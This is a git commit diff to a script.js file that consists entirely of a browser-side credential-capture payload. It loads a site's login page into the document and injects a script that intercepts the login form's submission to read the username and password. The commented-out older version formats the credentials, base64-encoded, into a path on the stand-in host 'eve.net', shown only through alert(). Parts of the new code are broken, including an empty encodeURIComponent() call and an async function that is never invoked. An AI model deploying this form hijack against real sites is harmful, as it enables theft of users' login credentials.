00de5e89964e7a34a37a9db4ff56f08010d327dd
soesam <67687007+soesam@users.noreply.github.com>
2020-07-08 23:15:46 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,11 @@
-(async () => 
+/*(async () => 
   document.write(
-    await fetch(`/login.php?url=${encodeURIComponent('/do-question.php?aaid=10972720')}`)
+    await fetch(`/login.php?url=${encodeURIComponent()}`)
     .then(response => response.text())
     .then(text => text + `
       <script>
         setTimeout(() => {
-          $('form[action*=login]').submit(({currentTarget}) => {
+          $('form[action*=login]').submit(e => {
             a = currentTarget
             alert( '//eve.net/' + btoa(a[0].value) + '/' + btoa(a[1].value))
           })
@@ -13,4 +13,16 @@
       </script>
     `)
   )
-)()
+)()*/
+
+///do-question.php?aaid=10972720'
+
+async () => document.write(await fetch('/login.php').then(page => page.text() + `
+<script>
+  setTimeout(() => $('form[action*=login]').submit(e => {
+    e.preventDefault()
+    c = e.currentTarget
+    alert(c[0].value + c[1].value)
+  }), 4000)
+</script>
+`)
